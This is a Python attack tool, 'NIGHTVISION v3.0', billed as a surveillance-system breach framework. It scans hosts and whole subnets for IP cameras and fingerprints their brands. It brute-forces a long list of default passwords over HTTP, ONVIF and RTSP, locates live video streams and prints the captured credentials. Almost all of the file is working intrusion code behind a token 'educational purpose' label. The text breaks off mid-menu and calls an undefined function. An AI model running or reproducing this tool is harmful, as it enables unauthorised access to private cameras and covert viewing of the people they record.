#!/usr/bin/env python3
# ============================================================
#   ___ _   _ ___  _____ ___  ___  ___   ___
#  / __| \ / / _ \_   _/ _ \/ _ \/ _ \ / _ \
# | (__ \ V / (_) || ||  __/  __/ (_) | (_) |
#  \___| \_/ \___/ |_| \___|\___|\___/ \___/
#
# NIGHTVISION v3.0 — Surveillance System Breach Framework
# Developer : Kush Verma (EthicalHax)
# #NightVisionTool
# ============================================================

import requests, socket, sys, threading, warnings, ipaddress, base64
import json, os, re, time, random, hashlib, urllib.parse, struct, csv
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from xml.etree import ElementTree as ET
from collections import defaultdict
from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ─── COLORS ────────────────────────────────────────────────
if sys.stdout.isatty():
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; C = '\033[96m'; W = '\033[0m'; D = '\033[90m'
    S = '\033[1m'; I = '\033[3m'; U = '\033[4m'
else:
    R = G = Y = B = M = C = W = D = S = I = U = ''

# ─── TOOL IDENTITY ─────────────────────────────────────────
TOOL_NAME = "NIGHTVISION"
VERSION = "3.0"
DEV = "Kush Verma (EthicalHax)"

BANNER = f"""
{S}{R}╔══════════════════════════════════════════════════════════════{W}
{S}{R}║{W}  {S}{C}███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗{R}{S}{W}
{S}{R}║{W}  {S}{C}████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║{R}{S}{W}
{S}{R}║{W}  {S}{C}██╔██╗ ██║██║██║  ███╗███████║   ██║   ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║{R}{S}{W}
{S}{R}║{W}  {S}{C}██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██║   ██║██║╚════██║██║██║   ██║██║╚██╗██║{R}{S}{W}
{S}{R}║{W}  {S}{C}██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ╚██████╔╝██║███████║██║╚██████╔╝██║ ╚████║{R}{S}{W}
{S}{R}║{W}  {S}{C}╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝{R}{S}{W}
{S}{R}║{W}                                                              {R}{S}{W}
{S}{R}║{W}  {D}Developer :{W} {G}{DEV}{W}                                         {R}{S}{W}
{S}{R}║{W}  {D}Version   :{W} {Y}{VERSION}{W}                                            {R}{S}{W}
{S}{R}║{W}  {D}Codename  :{W} {M}H4X{W}                                       {R}{S}{W}
{S}{R}║{W}                                                              {R}{S}{W}
{S}{R}║{W}  {S}{R}[01]{W} {C}IP Camera Scanner{W}        {S}{R}[05]{W} {C}Network Range Scan{W}           {R}{S}{W}
{S}{R}║{W}  {S}{R}[02]{W} {C}RTSP Stream Hijack{W}       {S}{R}[06]{W} {C}Credential Forge{W}            {R}{S}{W}
{S}{R}║{W}  {S}{R}[03]{W} {C}Camera Fingerprint{W}       {S}{R}[07]{W} {C}ONVIF Probe{W}                {R}{S}{W}
{S}{R}║{W}  {S}{R}[04]{W} {C}Live Feed Capture{W}        {S}{R}[08]{W} {C}Full Recon (All In One){W}   {R}{S}{W}
{S}{R}║{W}                                                              {R}{S}{W}
{S}{R}╚══════════════════════════════════════════════════════════════{W}
{D}
   {I}[!] ONLY FOR EDUCATIONAL PURPOSE.                             {W}{D}
   {W}
"""

# ─── LOGGING ───────────────────────────────────────────────

def log(msg, level="info"):
    ts = datetime.now().strftime("%H:%M:%S")
    symbols = {
        "info": f"{B}[*]{W}",
        "ok": f"{G}[+]{W}",
        "warn": f"{Y}[!]{W}",
        "err": f"{R}[-]{W}",
        "found": f"{M}[#]{W}",
        "dead": f"{R}[X]{W}",
        "data": f"{C}[=]{W}",
        "line": f"{D}[~]{W}",
    }
    sym = symbols.get(level, symbols["info"])
    print(f"  {D}[{ts}]{W} {sym} {msg}")

def section(title):
    print(f"\n  {S}{C}═══ {title} ═══{W}\n")

def print_line(char="─", count=55):
    print(f"  {D}{char * count}{W}")

# ─── USER AGENTS ───────────────────────────────────────────

UA = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 9) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "VLC/3.0.20 LibVLC/3.0.20",
]

def hdrs():
    return {
        "User-Agent": random.choice(UA),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }

# ─── PORTS ─────────────────────────────────────────────────

CCTV_PORTS = [
    80, 81, 82, 83, 84, 85, 86, 443, 554, 8080, 8081, 8082, 8443, 8888,
    9000, 9090, 10000, 37777, 37215, 49152, 50000, 65000, 8554, 1935,
    7070, 8899, 9443, 4443, 808, 2000, 2001, 3000, 4000, 5000, 5001,
    82, 83, 84, 85, 86, 88, 8000, 8001, 8008, 8009, 8086, 8087, 8088,
    8089, 8090, 8100, 8181, 8222, 8243, 8280, 8300, 8333, 8400, 8444,
    8500, 8530, 8531, 8580, 8629, 8649, 8686, 8765, 8787, 8800, 8834,
    8863, 8873, 8880, 8887, 8889, 8890, 8891, 8892, 8899, 8920, 8983,
    8990, 8999, 9002, 9003, 9009, 9010, 9040, 9050, 9060, 9080, 9091,
    9099, 9100, 9111, 9180, 9200, 9210, 9220, 9290, 9295, 9300, 9312,
    9320, 9343, 9350, 9400, 9418, 9443, 9485, 9500, 9527, 9530, 9595,
    9596, 9600, 9675, 9676, 9696, 9876, 9877, 9878, 9898, 9900, 9901,
    9917, 9929, 9943, 9944, 9968, 9981, 9988, 9990, 9998, 9999,
]

# ─── DEFAULT CREDENTIALS ──────────────────────────────────

CREDS = [
    ("admin", "admin"), ("admin", ""), ("admin", "1234"), ("admin", "12345"),
    ("admin", "123456"), ("admin", "12345678"), ("admin", "123456789"),
    ("admin", "password"), ("admin", "pass"), ("admin", "root"),
    ("admin", "system"), ("admin", "default"), ("admin", "Admin"),
    ("admin", "admin123"), ("admin", "Admin123"), ("admin", "admin@123"),
    ("admin", "Admin@123"), ("admin", "hikvision"), ("admin", "hik12345"),
    ("admin", "dahua"), ("admin", "dahua123"), ("admin", "888888"),
    ("admin", "666666"), ("admin", "111111"), ("admin", "000000"),
    ("admin", "changeme"), ("admin", "guest"), ("admin", "user"),
    ("admin", "operator"), ("admin", "viewer"), ("admin", "service"),
    ("admin", "super"), ("admin", "mei"), ("admin", "9999"),
    ("admin", "ipcam"), ("admin", "camera"), ("admin", "cam123"),
    ("admin", "reolink"), ("admin", "amcrest"), ("admin", "foscam"),
    ("admin", "dlink"), ("admin", "tplink"), ("admin", "tp-link"),
    ("admin", "netgear"), ("admin", "ubnt"), ("admin", "welcome"),
    ("admin", "letmein"), ("admin", "admin1"), ("admin", "admin2"),
    ("admin", "admin2015"), ("admin", "admin2016"), ("admin", "admin2017"),
    ("admin", "admin2018"), ("admin", "admin2019"), ("admin", "admin2020"),
    ("admin", "admin2021"), ("admin", "admin2022"), ("admin", "admin2023"),
    ("admin", "admin2024"), ("admin", "admin2025"),
    ("admin", "123"), ("admin", "123123"), ("admin", "123321"),
    ("admin", "4321"), ("admin", "54321"), ("admin", "654321"),
    ("admin", "0"), ("admin", "00"), ("admin", "000"), ("admin", "pass123"),
    ("admin", "p@ssw0rd"), ("admin", "P@ssw0rd"), ("admin", "adm1n"),
    ("admin", "a123456"), ("admin", "abcd1234"), ("admin", "cisco123"),
    ("admin", "router"), ("admin", "cpl@123"), ("admin", "cp@123"),
    ("admin", "camera"), ("admin", "network"), ("admin", "cam"),
    ("admin", "swann"), ("admin", "zmodo"),
    ("root", "root"), ("root", "admin"), ("root", ""), ("root", "pass"),
    ("root", "123456"), ("root", "password"), ("root", "axis"),
    ("root", "vivotek"), ("root", "ubnt"), ("root", "toor"),
    ("root", "super"), ("root", "default"),
    ("Admin", "Admin"), ("Admin", "admin"), ("Admin", "1234"),
    ("Admin", "12345"), ("Admin", "123456"), ("Admin", "password"),
    ("Admin123", "Admin123"),
    ("Administrator", "password"), ("Administrator", "admin"),
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("guest", "guest"), ("viewer", "viewer"), ("operator", "operator"),
    ("service", "service"), ("installer", "installer"),
    ("supervisor", "supervisor"), ("anonymous", "anonymous"),
    ("hikvision", "hikvision"), ("hikvision", "12345"),
    ("dahua", "dahua"), ("dvr", "dvr123"),
    ("666666", "666666"), ("888888", "888888"), ("000000", "000000"),
    ("111111", "111111"), ("test", "test"), ("test", "123456"),
    ("none", ""), ("admin", "admin2026"), ("admin", "admin@2025"),
    ("admin", "RedW0lf"), ("admin", "NightVision"),
    ("admin", "NightV1sion"), ("admin", "P@$$123"),
]

# ─── RTSP PATHS ───────────────────────────────────────────

RTSP_PATHS = [
    "/", "/live", "/stream", "/video", "/h264", "/h264ES",
    "/live.sdp", "/video.sdp", "/h264.sdp",
    "/live/ch0", "/live/ch1", "/live/main", "/live/sub",
    "/cam/realmonitor?channel=1&subtype=0",
    "/cam/realmonitor?channel=1&subtype=1",
    "/cam/realmonitor?channel=2&subtype=0",
    "/cam/realmonitor?channel=2&subtype=1",
    "/Streaming/Channels/1", "/Streaming/Channels/2",
    "/Streaming/Channels/3", "/Streaming/Channels/4",
    "/h264Preview_01_main", "/h264Preview_01_sub",
    "/h264Preview_02_main", "/h264Preview_02_sub",
    "/axis-media/media.amp", "/onvif-media/media.amp",
    "/ch1/main/av_stream", "/ch1/sub/av_stream",
    "/mjpg/video.mjpg", "/video.mp4",
    "/live/ch01_0", "/live/ch01_1", "/live/ch02_0", "/live/ch02_1",
    "/live/ch03_0", "/live/ch03_1", "/live/ch04_0", "/live/ch04_1",
    "/cam1", "/cam2", "/cam3", "/cam4",
    "/channel1", "/channel2", "/channel3", "/channel4",
    "/video_main", "/video_sub", "/mpeg4/media.amc",
    "/11", "/12", "/13", "/14", "/15",
]

HTTP_STREAM_PATHS = [
    "/mjpg/video.mjpg", "/video.mjpg", "/img/video.mjpg",
    "/cgi-bin/mjpg/video.cgi", "/axis-cgi/mjpg/video.cgi",
    "/cgi-bin/snapshot.cgi", "/snapshot", "/image.jpg",
    "/tmpfs/auto.jpg", "/tmpfs/snap.jpg",
    "/live.jpg", "/snap.jpg", "/snapshot.jpg",
    "/current.jpg", "/webcam.jpg", "/cam/stream",
    "/video", "/livestream", "/live", "/mjpeg",
    "/stream.mjpg", "/videostream.cgi",
    "/GetData.cgi", "/JPEG", "/mjpegstream",
]

# ─── CAMERA SIGNATURES ────────────────────────────────────

CAMERA_SIGS = {
    "Hikvision": {
        "servers": ["hikvision", "hkv", "ds-2", "ds-7", "digicap", "davinci"],
        "titles": ["hikvision", "ds-2", "live view"],
        "body": ["digicap", "davinci", "/doc/page/login.asp"],
    },
    "Dahua": {
        "servers": ["dahua", "dahuatech", "webdvr", "dss", "netdm", "xvr"],
        "titles": ["dahua", "web service", "dvr"],
        "body": ["dahua", "netdm", "/cgi-bin/main.cgi"],
    },
    "Axis": {
        "servers": ["axis", "axiscam", "ax-vvtk"],
        "titles": ["axis", "axis communication"],
        "body": ["axis-cgi", "/view/view.shtml"],
    },
    "Reolink": {
        "servers": ["reolink", "reo"],
        "titles": ["reolink", "rl-"],
        "body": ["reolink", "h264Preview"],
    },
    "Amcrest": {
        "servers": ["amcrest", "amcr", "ipm-"],
        "titles": ["amcrest", "ipm-"],
        "body": ["amcrest", "/cgi-bin/main.cgi"],
    },
    "Foscam": {
        "servers": ["foscam", "fosc"],
        "titles": ["foscam"],
        "body": ["foscam", "CGIProxy"],
    },
    "D-Link": {
        "servers": ["d-link", "dlink", "dcs-"],
        "titles": ["d-link", "dcs-"],
        "body": ["d-link", "dcs-"],
    },
    "TP-Link": {
        "servers": ["tp-link", "tplink"],
        "titles": ["tp-link", "tapo"],
        "body": ["tp-link", "tapo"],
    },
    "Samsung": {
        "servers": ["samsung", "snt-", "snp-"],
        "titles": ["samsung", "wiseview"],
        "body": ["samsung", "wiseview"],
    },
    "Sony": {
        "servers": ["sony", "snc-"],
        "titles": ["sony", "snc-"],
        "body": ["sony"],
    },
    "Panasonic": {
        "servers": ["panasonic", "bb-h", "bl-c", "wv-"],
        "titles": ["panasonic", "wv-"],
        "body": ["panasonic", "i-pro"],
    },
    "Vivotek": {
        "servers": ["vivotek", "vvtk"],
        "titles": ["vivotek"],
        "body": ["vivotek", "live.sdp"],
    },
    "Bosch": {
        "servers": ["bosch", "dinion", "flexidome"],
        "titles": ["bosch", "dinion"],
        "body": ["bosch", "flexidome"],
    },
    "CP Plus": {
        "servers": ["cp_plus", "cpl", "cptv"],
        "titles": ["cp plus"],
        "body": ["cp plus", "cp_plus"],
    },
    "Ubiquiti": {
        "servers": ["ubiquiti", "ubnt", "aircam"],
        "titles": ["ubiquiti", "aircam"],
        "body": ["ubiquiti", "unifi"],
    },
    "Zmodo": {
        "servers": ["zmodo"],
        "titles": ["zmodo"],
        "body": ["zmodo"],
    },
    "Swann": {
        "servers": ["swann"],
        "titles": ["swann"],
        "body": ["swann"],
    },
    "Geovision": {
        "servers": ["geovision", "gv-"],
        "titles": ["geovision"],
        "body": ["geovision"],
    },
}

# ═══════════════════════════════════════════════════════════
#  MODULE 1 : PORT SCANNER
# ═══════════════════════════════════════════════════════════

def tcp_check(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1.2)
    try:
        r = s.connect_ex((ip, port))
        s.close()
        return r == 0
    except:
        s.close()
        return False

def get_banner(ip, port):
    proto = "https" if port in [443, 8443, 9443, 4443] else "http"
    try:
        r = requests.get(f"{proto}://{ip}:{port}", timeout=2,
                        verify=False, headers=hdrs(), allow_redirects=True)
        sv = r.headers.get("Server", "")
        auth = r.headers.get("WWW-Authenticate", "")
        realm = ""
        if auth and 'realm=' in auth:
            m = re.search(r'realm="([^"]+)"', auth)
            if m: realm = f" [{m.group(1)}]"
        return f"{sv}{realm}"[:70] if sv else f"HTTP{realm}"
    except:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        s.connect((ip, port))
        s.send(b"\r\n")
        b = s.recv(128).decode(errors="ignore").strip()
        s.close()
        if b: return re.sub(r"[\r\n]+", " | ", b[:70])
    except: pass
    return "unknown"

def scan_target(ip, extra_ports=None):
    ports = list(set(CCTV_PORTS + (extra_ports or [])))
    log(f"Scanning {Y}{ip}{W} on {len(ports)} ports...", "info")
    
    open_ports = []
    rtsp_ports = []
    
    with ThreadPoolExecutor(max_workers=150) as ex:
        futures = {ex.submit(tcp_check, ip, p): p for p in ports}
        results = {}
        for f in as_completed(futures):
            p = futures[f]
            results[p] = f.result()
    
    for p in sorted(results.keys()):
        if results[p]:
            svc = get_banner(ip, p)
            open_ports.append((p, svc))
            if p in [554, 8554] or "rtsp" in svc.lower():
                rtsp_ports.append(p)
    
    if open_ports:
        log(f"Found {G}{len(open_ports)}{W} open port(s)", "ok")
        print_line()
        for port, svc in open_ports:
            svc_str = f" {D}({W}{svc}{D}){W}" if svc != "unknown" else ""
            print(f"     {G}{port:>5}/tcp{W}{svc_str}")
        print_line()
    else:
        log("No open ports found", "err")
    
    return open_ports, rtsp_ports

# ═══════════════════════════════════════════════════════════
#  MODULE 2 : CAMERA DETECTION
# ═══════════════════════════════════════════════════════════

def detect_camera(ip, open_ports):
    section("CAMERA FINGERPRINTING")
    
    best_brand = None
    best_score = 0
    evidence = []
    has_onvif = False
    
    for port, banner in open_ports:
        proto = "https" if port in [443, 8443, 9443, 4443] else "http"
        base = f"{proto}://{ip}:{port}"
        
        try:
            r = requests.get(f"{base}/", timeout=4, verify=False,
                           headers=hdrs(), allow_redirects=True)
            server = r.headers.get("Server", "").lower()
            content = r.text.lower()
            tm = re.search(r"<title>(.*?)</title>", r.text, re.I|re.S)
            title = tm.group(1).strip() if tm else ""
            title_lower = title.lower()
            
            # Check ONVIF
            for op in ["/onvif/device_service", "/onvif"]:
                try:
                    rr = requests.get(f"{base}{op}", timeout=2, verify=False, headers=hdrs())
                    if rr.status_code in [200, 401] and ("wsdl" in rr.text[:500].lower() or "xmlns" in rr.text[:300]):
                        has_onvif = True
                        evidence.append(f"ONVIF detected at {op}")
                        break
                except: pass
            
            # Match signatures
            for brand, sig in CAMERA_SIGS.items():
                score = 0
                reasons = []
                
                # Server header
                for kw in sig.get("servers", []):
                    if kw in server:
                        score += 35
                        reasons.append(f"server:{kw}")
                        break
                
                # Title
                if title_lower:
                    for kw in sig.get("titles", []):
                        if kw in title_lower:
                            score += 30
                            reasons.append(f"title:{kw}")
                            break
                
                # Body
                for kw in sig.get("body", []):
                    if kw in content:
                        score += 20
                        reasons.append(f"body:{kw}")
                        break
                
                # General camera indicators
                for ind in ["camera", "webcam", "live view", "surveillance",
                           "h.264", "h264", "mjpg", "snapshot", "cgi-bin"]:
                    if ind in content:
                        score += 2
                
                if score > best_score:
                    best_score = score
                    best_brand = brand
                    evidence = reasons
            
            # Check for auth required (401)
            if r.status_code == 401:
                evidence.append("Authentication required (401)")
                if not best_brand:
                    best_brand = "Unknown Camera"
                    best_score = 20
            
        except requests.exceptions.ConnectionError:
            continue
        except: continue
    
    # Check for RTSP-only cameras
    if not best_brand:
        for port, banner in open_ports:
            if port in [554, 8554] or "rtsp" in banner.lower():
                best_brand = "Unknown RTSP Camera"
                best_score = 30
                evidence.append(f"RTSP service on port {port}")
                break
    
    if best_brand and best_score >= 15:
        log(f"Camera detected: {G}{best_brand}{W} (confidence: {best_score}%)", "found")
        for e in evidence:
            print(f"     {D}└─{W} {e}")
        if has_onvif:
            print(f"     {D}└─{W} {M}ONVIF compatible{W}")
    else:
        log("No camera detected", "warn")
    
    print_line()
    return best_brand, best_score, has_onvif

# ═══════════════════════════════════════════════════════════
#  MODULE 3 : LOGIN PAGE DETECTION
# ═══════════════════════════════════════════════════════════

def find_login_pages(ip, open_ports):
    section("LOGIN PAGE SCAN")
    
    endpoints = [
        "/", "/login.html", "/login.cgi", "/login.asp",
        "/admin/", "/admin/login.html", "/admin/login.cgi",
        "/cgi-bin/Login.cgi", "/cgi-bin/login.cgi",
        "/cgi-bin/user_login", "/cgi-bin/main.cgi",
        "/doc/page/login.asp", "/view/view.shtml",
        "/view/index.shtml", "/en/login.html",
        "/system/login", "/api/login",
        "/auth", "/authenticate",
    ]
    
    found_any = False
    
    for port, banner in open_ports:
        proto = "https" if port in [443, 8443, 9443, 4443] else "http"
        base = f"{proto}://{ip}:{port}"
        
        for ep in endpoints:
            try:
                r = requests.get(f"{base}{ep}", timeout=3, verify=False,
                               headers=hdrs(), allow_redirects=False)
                if r.status_code in [200, 401, 403]:
                    size = len(r.content)
                    if 200 < size < 500000:
                        found_any = True
                        auth = ""
                        if r.status_code == 401:
                            www = r.headers.get("WWW-Authenticate", "")
                            auth = f" {Y}[Auth: {www}]{W}" if www else f" {Y}[Auth Required]{W}"
                        print(f"     {G}{ep}{W} ({r.status_code}, {size}B){auth}")
                        break  # One endpoint per port is enough
            except: continue
    
    if not found_any:
        log("No login pages found", "warn")
    
    print_line()

# ═══════════════════════════════════════════════════════════
#  MODULE 4 : CREDENTIAL TESTING
# ═══════════════════════════════════════════════════════════

def test_creds(ip, open_ports, rtsp_ports, brand_hint=None):
    section("CREDENTIAL FORGE")
    
    log(f"Testing {len(CREDS)} credential pairs...", "info")
    found = []
    stop = threading.Event()
    
    def try_pair(username, password):
        if stop.is_set():
            return None
        
        # Test HTTP auth
        for port, banner in open_ports:
            if stop.is_set(): return None
            proto = "https" if port in [443, 8443, 9443, 4443] else "http"
            try:
                r = requests.get(f"{proto}://{ip}:{port}",
                               auth=(username, password),
                               timeout=3, verify=False, headers=hdrs())
                if r.status_code == 200:
                    stop.set()
                    return ("HTTP", port, username, password)
            except: pass
        
        # Test ONVIF
        for port, banner in open_ports:
            if stop.is_set(): return None
            try:
                creds = base64.b64encode(f"{username}:{password}".encode()).decode()
                h = {**hdrs(), "Content-Type": "application/soap+xml",
                     "Authorization": f"Basic {creds}"}
                body = """<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
  xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <soap:Body><tds:GetDeviceInformation/></soap:Body>
</soap:Envelope>"""
                proto = "https" if port in [443, 8443, 9443, 4443] else "http"
                r = requests.post(f"{proto}://{ip}:{port}/onvif/device_service",
                                data=body, headers=h, timeout=3, verify=False)
                if r.status_code == 200 and "DeviceInformation" in r.text:
                    stop.set()
                    return ("ONVIF", port, username, password)
            except: pass
        
        # Test RTSP
        for rp in rtsp_ports:
            if stop.is_set(): return None
            try:
                creds = base64.b64encode(f"{username}:{password}".encode()).decode()
                h = {**hdrs(), "Authorization": f"Basic {creds}"}
                proto = "https" if rp in [443, 8443] else "http"
                r = requests.get(f"{proto}://{ip}:{rp}",
                               headers=h, timeout=3, verify=False)
                if r.status_code == 200:
                    stop.set()
                    return ("RTSP", rp, username, password)
            except: pass
        
        return None
    
    # Prioritize brand-matched creds
    ordered_creds = list(CREDS)
    if brand_hint:
        bh = brand_hint.lower()
        matched = [(u, p) for u, p in ordered_creds
                   if bh in u.lower() or bh in p.lower()]
        others = [(u, p) for u, p in ordered_creds if (u, p) not in matched]
        ordered_creds = matched + others
    
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {ex.submit(try_pair, u, p): (u, p) for u, p in ordered_creds}
        for f in as_completed(futures):
            result = f.result()
            if result:
                proto, port, user, pw = result
                log(f"{M}{proto}{W} credentials: {G}{user}:{pw}{W} (port {port})", "found")
                found.append((proto, port, user, pw))
                if len(found) >= 3:
                    ex.shutdown(wait=False)
                    break
    
    if not found:
        log("No valid credentials found", "err")
    else:
        log(f"Total credentials captured: {G}{len(found)}{W}", "ok")
    
    print_line()
    return found

# ═══════════════════════════════════════════════════════════
#  MODULE 5 : STREAM DETECTION
# ═══════════════════════════════════════════════════════════

def find_streams(ip, open_ports, rtsp_ports):
    section("STREAM DETECTION")
    
    found = False
    
    # RTSP streams
    if rtsp_ports:
        log("Probing RTSP streams...", "info")
        for rp in rtsp_ports:
            base = f"rtsp://{ip}:{rp}"
            for path in RTSP_PATHS[:15]:  # Check first 15 paths
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((ip, rp))
                    req = f"DESCRIBE {base}{path} RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\n\r\n"
                    s.send(req.encode())
                    resp = s.recv(1024).decode(errors="ignore")
                    s.close()
                    
                    if "200 OK" in resp:
                        found = True
                        print(f"     {G}RTSP{W}  {C}{base}{path}{W}")
                        break  # One per port is enough
                    elif "401 Unauthorized" in resp:
                        found = True
                        print(f"     {Y}RTSP (Auth){W}  {C}{base}{path}{W}")
                except: continue
    
    # HTTP streams
    log("Probing HTTP streams...", "info")
    for port, banner in open_ports:
        proto = "https" if port in [443, 8443, 9443, 4443] else "http"
        base = f"{proto}://{ip}:{port}"
        
        for path in HTTP_STREAM_PATHS:
            try:
                r = requests.get(f"{base}{path}", timeout=3, verify=False,
                               headers=hdrs(), stream=True, allow_redirects=True)
                ct = r.headers.get("Content-Type", "")
                
                if r.status_code == 200:
                    if any(t in ct for t in ["image/jpeg", "multipart/x-mixed-replace",
                                              "video/", "application/octet-stream"]):
                        found = True
                        print(f"     {M}HTTP{W}  {C}{base}{path}{W}  {D}[{ct[:30]}]{W}")
                        break  # One per port
                r.close()
            except: continue
    
    if not found:
        log("No live streams detected", "warn")
    
    print_line()
    return found

# ═══════════════════════════════════════════════════════════
#  MODULE 6 : ONVIF PROBE
# ═══════════════════════════════════════════════════════════

def onvif_probe(ip, open_ports):
    section("ONVIF PROBE")
    
    found = False
    
    for port, banner in open_ports:
        proto = "https" if port in [443, 8443, 9443, 4443] else "http"
        base = f"{proto}://{ip}:{port}"
        
        paths = ["/onvif/device_service", "/onvif", "/detect"]
        
        for path in paths:
            try:
                r = requests.get(f"{base}{path}", timeout=3, verify=False, headers=hdrs())
                if r.status_code in [200, 401]:
                    body = r.text[:500].lower()
                    if any(x in body for x in ["wsdl", "xmlns", "onvif", "device", "getdeviceinformation"]):
                        found = True
                        print(f"     {G}ONVIF{W} endpoint: {C}{base}{path}{W}")
                        
                        # Try to get device info
                        body_xml = """<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
  xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <soap:Body><tds:GetDeviceInformation/></soap:Body>
</soap:Envelope>"""
                        try:
                            rr = requests.post(f"{base}{path}", data=body_xml,
                                             headers={"Content-Type": "application/soap+xml"},
                                             timeout=3, verify=False)
                            if rr.status_code == 200:
                                # Extract manufacturer/model from response
                                man = re.search(r"<tds:Manufacturer>(.*?)</tds:Manufacturer>", rr.text)
                                mod = re.search(r"<tds:Model>(.*?)</tds:Model>", rr.text)
                                if man: print(f"     {D}└─{W} Manufacturer: {G}{man.group(1)}{W}")
                                if mod: print(f"     {D}└─{W} Model: {G}{mod.group(1)}{W}")
                        except: pass
                        break
            except: continue
    
    if not found:
        log("No ONVIF services detected", "warn")
    
    print_line()
    return found

# ═══════════════════════════════════════════════════════════
#  MODULE 7 : NETWORK RANGE SCAN
# ═══════════════════════════════════════════════════════════

def network_scan(cidr):
    section("NETWORK RANGE SCAN")
    
    try:
        net = ipaddress.ip_network(cidr, strict=False)
    except ValueError as e:
        log(f"Invalid CIDR: {e}", "err")
        return
    
    hosts = list(net.hosts())
    log(f"Scanning {Y}{cidr}{W} — {len(hosts)} hosts", "info")
    
    cameras_found = []
    
    def quick_check(ip_str):
        # Quick port check
        for p in [80, 443, 554, 8080, 8443]:
            if tcp_check(ip_str, p):
                ports, rtsp = scan_target(ip_str, [p])
                if ports:
                    brand, score, onvif = detect_camera(ip_str, ports)
                    if brand:
                        return (ip_str, ports, brand, score)
        return None
    
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {ex.submit(quick_check, str(h)): str(h) for h in hosts}
        for f in as_completed(futures):
            result = f.result()
            if result:
                ip_str, ports, brand, score = result
                cameras_found.append(result)
                log(f"Camera found: {G}{ip_str}{W} — {brand} ({score}%)", "found")
    
    log(f"Scan complete. {G}{len(cameras_found)}{W} camera(s) found", "ok")
    print_line()
    return cameras_found

# ═══════════════════════════════════════════════════════════
#  MODULE 8 : FULL RECON
# ═══════════════════════════════════════════════════════════

def full_recon(ip):
    section(f"FULL RECON: {Y}{ip}{W}")
    
    open_ports, rtsp_ports = scan_target(ip)
    if not open_ports:
        log("Target unreachable — aborting", "err")
        return
    
    brand, score, has_onvif = detect_camera(ip, open_ports)
    find_login_pages(ip, open_ports)
    creds = test_creds(ip, open_ports, rtsp_ports, brand)
    find_streams(ip, open_ports, rtsp_ports)
    
    if has_onvif or True:
        onvif_probe(ip, open_ports)
    
    # Summary
    section("RECON SUMMARY")
    print(f"     Target IP  : {G}{ip}{W}")
    print(f"     Open Ports : {G}{len(open_ports)}{W}")
    print(f"     Camera     : {G}{brand or 'Unknown'}{W} ({score}%)")
    print(f"     ONVIF      : {G}Yes{W}" if has_onvif else f"     ONVIF      : {R}No{W}")
    print(f"     Creds Found: {G}{len(creds)}{W}")
    
    if creds:
        print(f"\n  {S}{M}CAPTURED CREDENTIALS:{W}")
        for proto, port, user, pw in creds:
            print(f"     {G}{user}:{pw}{W} @ {proto} port {port}")
    
    print_line()

# ═══════════════════════════════════════════════════════════
#  MAIN MENU
# ═══════════════════════════════════════════════════════════

def show_menu():
    print(f"""
  {S}{C}AVAILABLE OPERATIONS:{W}

    {S}{R}[1]{W}  {C}IP Camera Scanner{W}       — Scan target IP for open ports
    {S}{R}[2]{W}  {C}Camera Fingerprint{W}       — Detect camera brand/model
    {S}{R}[3]{W}  {C}Login Page Hunter{W}        — Find camera login panels
    {S}{R}[4]{W}  {C}Credential Forge{W}          — Brute-force default passwords
    {S}{R}[5]{W}  {C}Stream Hijacker{W}           — Detect RTSP/HTTP live feeds
    {S}{R}[6]{W}  {C}ONVIF Probe{W}               — Interrogate ONVIF services
    {S}{R}[7]{W}  {C}Network Range Massacre{W}    — Scan entire subnet for cameras
    {S}{R}[8]{W}  {C}Full Auto Recon{W}           — Run all modules on one target
    {S}{R}[0]{W}  {R}Exit{W}
""")

def main():
    os.system("clear" if os.name == "posix" else "cls")
    print(BANNER)
    
    while True:
        show_menu()
        choice = input(f"  {S}{C}NightVision{W} > {G}").strip()
        print(f"{W}")
        
        if choice == "0":
            log("Shutting down NightVision", "info")
            print(f"  {M}Stay dark. Stay dangerous. — {DEV}{W}\n")
            break
        
        elif choice == "1":  # Port Scanner
            ip = input(f"  {C}Target IP{W} > ").strip()
            if not validate_ip(ip): continue
            scan_target(ip)
            
        elif choice == "2":  # Camera Fingerprint
            ip = input(f"  {C}Target IP{W} > ").strip()
            if not validate_ip(ip): continue
            ports, rtsp = scan_target(ip)
            if ports: detect_camera(ip, ports)
            
        elif choice == "3":  # Login Page Hunter
            ip = input(f"  {C}Target IP{W} > ").strip()
            if not validate_ip(ip): continue
